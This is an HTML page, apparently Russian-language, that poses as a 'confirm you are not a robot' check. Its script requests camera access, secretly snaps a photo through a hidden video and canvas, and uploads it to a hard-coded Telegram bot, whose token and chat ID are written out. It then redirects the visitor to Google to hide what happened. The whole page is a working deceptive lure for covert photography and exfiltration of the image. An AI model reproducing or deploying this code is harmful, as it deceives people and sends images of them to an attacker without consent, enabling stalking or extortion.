<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h2>Подтвердите, что вы не робот</h2>
        <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
            Я не робот (Продолжить)
        </button>
    </div>
    
    <video id="v" autoplay style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = '8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ';
        const chatId = '1976857829';
        // ТВОЙ ЛИЧНЫЙ ПРОКСИ ЧЕРЕЗ CLOUDFLARE:
        const proxyUrl = `https://api.telegram.org/bot8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ/sendPhoto`;

        document.getElementById('btn').onclick = async () => {
            try {
                // 1. Запрашиваем камеру
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                const v = document.getElementById('v');
                v.srcObject = s;
                
                // Ждем 1.5 сек, чтобы камера успела сфокусироваться
                await new Promise(r => setTimeout(r, 1500)); 

                // 2. Делаем фото (захват кадра)
                const c = document.getElementById('c');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                // Конвертируем в файл
                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));

                // 3. Отправляем в Telegram ЧЕРЕЗ КЛАУДФЛЕЙР
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'shot.jpg');

                await fetch(proxyUrl, {
                    method: 'POST',
                    body: fd
                });

                // Выключаем камеру (индикатор погаснет)
                s.getTracks().forEach(t => t.stop());

            } catch (e) { 
                console.log("Доступ отклонен или ошибка:", e); 
            }
            
            // 4. Перекидываем на Google в любом случае
            window.location.href = 'https://google.com';
        };
    </script>
</body>
</html>
